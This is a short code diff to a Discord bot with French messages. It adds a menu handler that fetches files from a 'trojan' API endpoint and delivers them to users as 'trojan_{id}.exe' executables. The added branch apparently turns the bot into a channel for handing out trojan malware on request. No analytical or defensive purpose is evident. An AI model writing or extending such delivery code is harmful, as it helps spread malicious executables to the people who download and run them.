@@ -71,6 +71,12 @@ client.on('interactionCreate', async interaction => {
         const endpoint = `${API_BASE_URL}/papier/papier/${papierDataId}`;
         const filename = `papier_${papierDataId}.txt`;
         await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
+    } else if (interaction.customId === "select_trojan") {
+        const trojanDataId = interaction.values[0];
+        const endpoint = `${API_BASE_URL}/trojan/trojan/${trojanDataId}`;
+        const filename = `trojan_${trojanDataId}.exe`;
+        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
+
     }
 
 });
